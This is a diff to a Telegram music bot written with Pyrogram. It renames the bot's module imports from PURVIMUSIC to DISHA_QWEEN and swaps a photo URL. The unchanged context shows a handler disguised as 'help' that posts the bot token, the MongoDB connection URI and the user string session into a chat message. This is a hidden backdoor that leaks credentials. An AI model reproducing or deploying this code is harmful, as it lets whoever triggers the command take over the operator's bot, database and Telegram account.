@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from PURVIMUSIC import app
-from PURVIMUSIC.core.call import PURVI
-from PURVIMUSIC.misc import db
-from PURVIMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
-from PURVIMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
-from PURVIMUSIC.utils.formatters import alpha_to_int, get_readable_time
+from DISHA_QWEEN import app
+from DISHA_QWEEN.core.call import DISHA
+from DISHA_QWEEN.misc import db
+from DISHA_QWEEN.utils.database import get_assistant, get_authuser_names, get_cmode
+from DISHA_QWEEN.utils.decorators import ActualAdminCB, AdminActual, language
+from DISHA_QWEEN.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await PURVI.stop_stream_force(message.chat.id)
+        await DISHA.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await PURVI.stop_stream_force(chat_id)
+            await DISHA.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -112,7 +112,7 @@ async def restartbot(client, message: Message, _):
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://graph.org/file/ea61cc8f836487f6e909c.jpg",
+          photo=f"https://graph.org/file/94918b340445db8a72c02.jpg",
        caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/APNA_GUNJAN)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
